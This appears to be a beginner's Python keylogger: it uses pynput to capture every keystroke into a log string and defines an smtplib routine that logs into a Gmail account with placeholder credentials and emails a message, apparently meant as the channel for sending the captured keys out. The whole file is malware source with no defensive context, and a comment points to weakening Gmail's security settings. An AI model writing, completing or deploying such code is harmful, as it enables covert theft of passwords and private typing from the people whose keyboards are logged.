import pynput.keyboard
import smtplib
log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)

    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def send_email():
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login("x@gmail.com", "x1x2x3x4x5")
    email_server.sendmail("x@gmail.com", "x@gmail.com", "Test message")
    email_server.quit()
# google mail + security + lessecury + on 

send_email()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)



with keylogger_listener:
    keylogger_listener.join()
